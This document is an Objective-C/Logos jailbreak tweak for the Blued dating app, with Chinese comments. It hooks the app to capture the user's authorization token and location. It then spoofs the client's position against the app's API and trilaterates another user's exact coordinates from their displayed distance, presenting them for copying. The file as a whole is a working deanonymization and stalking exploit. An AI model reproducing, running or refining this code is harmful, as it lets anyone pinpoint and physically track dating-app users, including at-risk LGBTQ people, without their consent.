#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>
#import <math.h>
#import <objc/runtime.h>

#define TRACK_BTN_TAG 100001
#define MAX_RECURSIVE_ATTEMPTS 12
#define LOCK_THRESHOLD 0.01
#define EARTH_RADIUS_KM 111.32

// 全局变量
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;
// 【新增】自动记录的坐标
static double g_myRealLat = 0.0;
static double g_myRealLng = 0.0;
static BOOL g_hasLocationRecord = NO;

// ====================== CLLocationManager Hook（自动记录坐标） ======================
%hook CLLocationManager

// 拦截所有位置更新
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    %orig;
    
    if (locations.count > 0) {
        CLLocation *latestLocation = locations.lastObject;
        g_myRealLat = latestLocation.coordinate.latitude;
        g_myRealLng = latestLocation.coordinate.longitude;
        g_hasLocationRecord = YES;
        
        NSLog(@"[TrackHook] 记录到坐标: %.8f, %.8f (精度: %.0f米)", g_myRealLat, g_myRealLng, latestLocation.horizontalAccuracy);
        
        // 同时保存到 NSUserDefaults 作为备份
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        [defaults setDouble:g_myRealLat forKey:@"trackhook_last_lat"];
        [defaults setDouble:g_myRealLng forKey:@"trackhook_last_lng"];
        [defaults setObject:[NSDate date] forKey:@"trackhook_last_time"];
        [defaults synchronize];
    }
}

// 兼容旧版 API（某些APP可能使用旧的 delegate 方法）
- (void)locationManager:(CLLocationManager *)manager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)oldLocation {
    %orig;
    
    if (newLocation) {
        g_myRealLat = newLocation.coordinate.latitude;
        g_myRealLng = newLocation.coordinate.longitude;
        g_hasLocationRecord = YES;
        
        NSLog(@"[TrackHook] 记录到坐标(旧API): %.8f, %.8f", g_myRealLat, g_myRealLng);
    }
}

%end

// ====================== NSURLSession Hook（抓取 Token） ======================
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    NSDictionary *headers = request.allHTTPHeaderFields;
    NSString *authHeader = headers[@"authorization"] ?: headers[@"Authorization"];
    if (authHeader && [authHeader hasPrefix:@"Basic "]) {
        NSString *basicToken = [authHeader substringFromIndex:6];
        if (basicToken.length > 0 && ![g_bluedBasicToken isEqualToString:basicToken]) {
            g_bluedBasicToken = basicToken;
            NSLog(@"[TrackHook] 抓取到 Token: %@", basicToken);
        }
    }
    return %orig(request, completionHandler);
}
%end

// ====================== UIWindow Hook（悬浮按钮） ======================
%hook UIWindow

%new
- (void)trackHook_addFloatingButton {
    UIButton *existBtn = [self viewWithTag:TRACK_BTN_TAG];
    if (existBtn) {
        [self bringSubviewToFront:existBtn];
        return;
    }
    
    UIButton *trackBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    trackBtn.tag = TRACK_BTN_TAG;
    [trackBtn setTitle:@"🛰️ 定位" forState:UIControlStateNormal];
    trackBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
    [trackBtn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    trackBtn.backgroundColor = [UIColor colorWithRed:0.91 green:0.12 blue:0.39 alpha:1.0];
    trackBtn.layer.cornerRadius = 20;
    trackBtn.layer.borderWidth = 2;
    trackBtn.layer.borderColor = [UIColor whiteColor].CGColor;
    trackBtn.clipsToBounds = YES;
    
    CGFloat topMargin = 100;
    if (@available(iOS 11.0, *)) {
        topMargin = self.safeAreaInsets.top + 60;
    }
    
    trackBtn.frame = CGRectMake(self.bounds.size.width - 110, topMargin, 90, 40);
    trackBtn.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleBottomMargin;
    
    [trackBtn addTarget:self action:@selector(trackHook_onButtonClick:) forControlEvents:UIControlEventTouchUpInside];
    
    [self addSubview:trackBtn];
    NSLog(@"[TrackHook] 按钮已添加到 %@", NSStringFromClass([self class]));
}

%new
- (void)trackHook_onButtonClick:(UIButton *)sender {
    UIViewController *topVC = [self trackHook_topViewController];
    if (!topVC) {
        [self showToast:@"无法获取当前页面" duration:2.0];
        return;
    }
    
    NSLog(@"[TrackHook] 点击按钮，当前页面: %@", NSStringFromClass([topVC class]));
    
    [self trackHook_extractUserInfoFromVC:topVC];
    [self trackHook_startTracking];
}

%new
- (UIViewController *)trackHook_topViewController {
    UIViewController *rootVC = self.rootViewController;
    if (!rootVC) return nil;
    
    UIViewController *topVC = rootVC;
    while (topVC.presentedViewController) {
        topVC = topVC.presentedViewController;
    }
    if ([topVC isKindOfClass:[UINavigationController class]]) {
        topVC = ((UINavigationController *)topVC).topViewController;
    } else if ([topVC isKindOfClass:[UITabBarController class]]) {
        topVC = ((UITabBarController *)topVC).selectedViewController;
        if ([topVC isKindOfClass:[UINavigationController class]]) {
            topVC = ((UINavigationController *)topVC).topViewController;
        }
    }
    return topVC;
}

%new
- (void)trackHook_extractUserInfoFromVC:(UIViewController *)vc {
    g_currentTargetUid = nil;
    g_initialDistance = -1.0;
    
    NSArray *possibleKeys = @[@"user", @"userInfo", @"userModel", @"viewModel", @"model", @"data", @"userData"];
    
    for (NSString *key in possibleKeys) {
        @try {
            id userObj = [vc valueForKey:key];
            if (!userObj) continue;
            
            NSString *uid = [userObj valueForKey:@"uid"] ?: [userObj valueForKey:@"userId"] ?: [userObj valueForKey:@"user_id"];
            if (uid && uid.length > 0) {
                g_currentTargetUid = uid;
                NSLog(@"[TrackHook] 从 %@.%@ 获取到 UID: %@", NSStringFromClass([vc class]), key, uid);
            }
            
            id distObj = [userObj valueForKey:@"distance"];
            if (distObj) {
                if ([distObj isKindOfClass:[NSNumber class]]) {
                    g_initialDistance = [distObj doubleValue];
                } else if ([distObj isKindOfClass:[NSString class]]) {
                    NSString *distStr = [(NSString *)distObj stringByTrimmingCharactersInSet:[[NSCharacterSet characterSetWithCharactersInString:@"0123456789."] invertedSet]];
                    g_initialDistance = [distStr doubleValue];
                }
                NSLog(@"[TrackHook] 获取到距离: %.2f km", g_initialDistance);
            }
            
            if (g_currentTargetUid && g_initialDistance > 0) break;
        } @catch (NSException *e) { continue; }
    }
}

%new
- (void)trackHook_startTracking {
    // 参数校验
    if (!g_currentTargetUid || g_currentTargetUid.length == 0) {
        [self showToast:@"❌ 请先打开目标用户主页" duration:3.0];
        return;
    }
    if (g_initialDistance < 0) {
        [self showToast:@"❌ 无法获取距离信息" duration:3.0];
        return;
    }
    if (g_initialDistance >= 9999.0 || g_initialDistance <= 0.0) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"⚠️ 追踪中止" message:@"目标开启了隐身或距离无效" preferredStyle:UIAlertControllerStyleAlert];
        [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil]];
        UIViewController *topVC = [self trackHook_topViewController];
        [topVC presentViewController:alert animated:YES completion:nil];
        return;
    }
    if (!g_bluedBasicToken || g_bluedBasicToken.length == 0) {
        [self showToast:@"❌ Token 为空，请先刷新附近列表" duration:3.0];
        return;
    }
    
    // 【关键修改】使用自动记录的坐标
    double myLat = 0.0;
    double myLng = 0.0;
    
    if (g_hasLocationRecord) {
        // 优先使用内存中记录的最新坐标（包含虚拟定位）
        myLat = g_myRealLat;
        myLng = g_myRealLng;
        NSLog(@"[TrackHook] 使用实时记录的坐标: %.8f, %.8f", myLat, myLng);
    } else {
        // 尝试从备份读取
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        myLat = [defaults doubleForKey:@"trackhook_last_lat"];
        myLng = [defaults doubleForKey:@"trackhook_last_lng"];
        
        if (myLat == 0 || myLng == 0) {
            [self showToast:@"❌ 未获取到定位坐标\n请先开启定位或刷新附近列表" duration:4.0];
            return;
        }
        NSLog(@"[TrackHook] 使用备份坐标: %.8f, %.8f", myLat, myLng);
    }
    
    // 显示确认弹窗（可选，让用户知道使用哪个坐标）
    NSString *msg = [NSString stringWithFormat:@"🛰️ 雷达启动\n目标距离: %.2f km\n当前坐标: %.4f, %.4f\n\n开始递归计算...", g_initialDistance, myLat, myLng];
    [self showToast:msg duration:3.0];
    
    // 启动算法
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self runRecursiveTrilaterationWithUid:g_currentTargetUid 
                                         token:g_bluedBasicToken 
                                      startLat:myLat 
                                      startLng:myLng 
                                     startDist:g_initialDistance];
    });
}

- (void)becomeKeyWindow {
    %orig;
    [self trackHook_addFloatingButton];
}

- (void)layoutSubviews {
    %orig;
    UIButton *btn = [self viewWithTag:TRACK_BTN_TAG];
    if (!btn) {
        [self trackHook_addFloatingButton];
    } else {
        [self bringSubviewToFront:btn];
    }
}

%end

// ====================== UIViewController Hook（页面监听） ======================
%hook UIViewController

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    
    NSString *className = NSStringFromClass([self class]);
    // 更宽松的判断：包含 User/Profile/Detail/Info 的都可能是用户页
    if ([className containsString:@"User"] || 
        [className containsString:@"Profile"] || 
        [className containsString:@"Detail"] ||
        [className containsString:@"Info"]) {
        
        NSLog(@"[TrackHook] 进入用户相关页面: %@", className);
        
        UIWindow *window = [UIApplication sharedApplication].keyWindow;
        if (window) {
            [window trackHook_addFloatingButton];
        }
    }
}

%end

// ====================== 工具方法实现 ======================
%hook NSObject

%new
- (UIWindow *)getCurrentMainWindow {
    UIWindow *window = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                window = scene.windows.firstObject;
                break;
            }
        }
    }
    if (!window) window = [UIApplication sharedApplication].keyWindow;
    if (!window) window = [UIApplication sharedApplication].windows.firstObject;
    return window;
}

%new
- (void)showToast:(NSString *)message duration:(NSTimeInterval)duration {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self getCurrentMainWindow];
        if (!window) return;
        
        for (UIView *subview in window.subviews) {
            if (subview.tag == 99999) [subview removeFromSuperview];
        }
        
        UILabel *toast = [[UILabel alloc] initWithFrame:CGRectMake(20, window.bounds.size.height/2 - 50, window.bounds.size.width - 40, 100)];
        toast.tag = 99999;
        toast.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
        toast.textColor = [UIColor whiteColor];
        toast.textAlignment = NSTextAlignmentCenter;
        toast.numberOfLines = 0;
        toast.font = [UIFont systemFontOfSize:14];
        toast.text = message;
        toast.layer.cornerRadius = 12;
        toast.clipsToBounds = YES;
        
        [window addSubview:toast];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(duration * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [UIView animateWithDuration:0.3 animations:^{
                toast.alpha = 0;
            } completion:^(BOOL finished) {
                [toast removeFromSuperview];
            }];
        });
    });
}

%new
- (void)showResultWithSuccess:(BOOL)success message:(NSString *)message lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self getCurrentMainWindow];
        if (!window) return;
        
        UIViewController *topVC = window.rootViewController;
        while (topVC.presentedViewController) topVC = topVC.presentedViewController;
        
        if (success) {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"🎯 雷达锁定成功" message:message preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                [[UIPasteboard generalPasteboard] setString:[NSString stringWithFormat:@"%.8f, %.8f", lat, lng]];
                [self showToast:@"✅ 坐标已复制" duration:2.0];
            }]];
            [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [topVC presentViewController:alert animated:YES completion:nil];
        } else {
            [self showToast:message duration:3.0];
        }
    });
}

%new
- (void)updateMyServerLocationWithToken:(NSString *)token lat:(double)lat lng:(double)lng {
    NSString *url = [NSString stringWithFormat:@"https://argo.blued.cn/users?sort_by=nearby&latitude=%.8f&longitude=%.8f&limit=1", lat, lng];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" forHTTPHeaderField:@"user-agent"];
    req.timeoutInterval = 3.0;
    
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_semaphore_signal(sema);
    }];
    [task resume];
    dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)));
}

%new
- (double)fetchDynamicDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)fakeLat fakeLng:(double)fakeLng {
    [self updateMyServerLocationWithToken:token lat:fakeLat lng:fakeLng];
    [NSThread sleepForTimeInterval:1.0];
    
    NSString *url = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"authorization"];
    req.timeoutInterval = 3.0;
    
    __block double result = -1.0;
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            @try {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                NSArray *dataArr = json[@"data"];
                if (dataArr.count > 0) {
                    int hide = [dataArr[0][@"is_hide_distance"] intValue];
                    if (hide == 0) {
                        result = [dataArr[0][@"distance"] doubleValue];
                    }
                }
            } @catch (NSException *e) {}
        }
        dispatch_semaphore_signal(sema);
    }];
    [task resume];
    dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)));
    
    return result;
}

%new
- (NSArray *)calculateIntersectionsWithLat1:(double)lat1 lng1:(double)lng1 r1:(double)r1 lat2:(double)lat2 lng2:(double)lng2 r2:(double)r2 {
    NSMutableArray *result = [NSMutableArray array];
    
    double x1 = 0.0, y1 = 0.0;
    double x2 = (lng2 - lng1) * EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0);
    double y2 = (lat2 - lat1) * EARTH_RADIUS_KM;
    
    double d = sqrt(x2*x2 + y2*y2);
    if (d > r1 + r2 || d < fabs(r1 - r2) || d == 0.0) return result;
    
    double a = (r1*r1 - r2*r2 + d*d) / (2*d);
    double h = sqrt(fmax(0.0, r1*r1 - a*a));
    
    double x3 = x1 + a * (x2 - x1) / d;
    double y3 = y1 + a * (y2 - y1) / d;
    
    double rx = -h * (y2 - y1) / d;
    double ry = h * (x2 - x1) / d;
    
    double latA = lat1 + (y3 + ry) / EARTH_RADIUS_KM;
    double lngA = lng1 + (x3 + rx) / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0));
    double latB = lat1 + (y3 - ry) / EARTH_RADIUS_KM;
    double lngB = lng1 + (x3 - rx) / (EARTH_RADIUS_KM * cos(lat1 * M_PI / 180.0));
    
    [result addObject:@[@(latA), @(lngA)]];
    [result addObject:@[@(latB), @(lngB)]];
    
    return result;
}

%new
- (void)runRecursiveTrilaterationWithUid:(NSString *)uid token:(NSString *)token startLat:(double)startLat startLng:(double)startLng startDist:(double)startDist {
    double curLat = startLat, curLng = startLng, curDist = startDist;
    
    for (int i = 1; i <= MAX_RECURSIVE_ATTEMPTS; i++) {
        if (curDist <= LOCK_THRESHOLD) {
            [self showResultWithSuccess:YES message:[NSString stringWithFormat:@"🎯 极限锁定！\n纬度: %.8f\n经度: %.8f\n误差: %.4fkm", curLat, curLng, curDist] lat:curLat lng:curLng];
            return;
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showToast:[NSString stringWithFormat:@"第 %d 次计算...\n距离: %.2fkm", i, curDist] duration:2.0];
        });
        
        double offsetLat = curLat;
        double offsetLng = curLng + (curDist / (EARTH_RADIUS_KM * cos(curLat * M_PI / 180.0)));
        
        double newDist = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:offsetLat fakeLng:offsetLng];
        if (newDist < 0) {
            [self showResultWithSuccess:NO message:@"获取距离失败" lat:0.0 lng:0.0];
            return;
        }
        
        NSArray *inters = [self calculateIntersectionsWithLat1:curLat lng1:curLng r1:curDist lat2:offsetLat lng2:offsetLng r2:newDist];
        if (inters.count < 2) {
            curLng += (curDist * 0.1) / (EARTH_RADIUS_KM * cos(curLat * M_PI / 180.0));
            continue;
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self showToast:@"验证交点中..." duration:1.5];
        });
        
        NSArray *p1 = inters[0];
        NSArray *p2 = inters[1];
        double d1 = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:[p1[0] doubleValue] fakeLng:[p1[1] doubleValue]];
        double d2 = [self fetchDynamicDistanceWithUid:uid token:token fakeLat:[p2[0] doubleValue] fakeLng:[p2[1] doubleValue]];
        
        if (d1 < 0 && d2 < 0) {
            [self showResultWithSuccess:NO message:@"交点验证失败" lat:0.0 lng:0.0];
            return;
        }
        
        if (d1 >= 0 && (d2 < 0 || d1 < d2)) {
            curLat = [p1[0] doubleValue];
            curLng = [p1[1] doubleValue];
            curDist = d1;
        } else {
            curLat = [p2[0] doubleValue];
            curLng = [p2[1] doubleValue];
            curDist = d2;
        }
    }
    
    [self showResultWithSuccess:YES message:[NSString stringWithFormat:@"计算完成\n纬度: %.8f\n经度: %.8f\n误差: %.4fkm", curLat, curLng, curDist] lat:curLat lng:curLng];
}

%end
